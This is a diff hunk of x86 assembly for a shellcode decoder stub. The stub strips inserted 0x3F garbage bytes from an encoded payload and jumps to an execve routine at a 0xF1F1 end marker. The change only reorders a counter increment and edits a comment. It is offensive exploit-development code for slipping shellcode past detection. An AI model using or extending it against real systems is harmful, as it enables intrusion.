@@ -52,15 +52,15 @@ mainflow:
 
 decoder:
 	mov ebx, dword [esi + ecx] 	; copy the two next bytes to ebx
+	inc ecx				; let's read the next byte in the next loop
 
 	cmp bx, 0xF1F1			; compares with the signature in the shellcode's end
 	je short execve			; is shellcode's end? if yes, run it
 
-	inc ecx				; let's read the next byte in the next loop
  	cmp bl, 0x3F			; compares with the garbage byte (0x3F) AAS instruction
 					; 3F is the least used opcode as analyzed here http://z0mbie.host.sk/opcodes.html (I know that it's a PE)
 
-	je short decoder		; is an inserted garbage byte? so continue looping and trying to find the next one
+	je short decoder		; is an inserted garbage byte? if yes continue looping and trying to find a good one
 
 	mov byte [edi], bl		; when isn't garbage, copy the byte to the correct address
 	inc edi				; let's to set the next byte of the shellcode
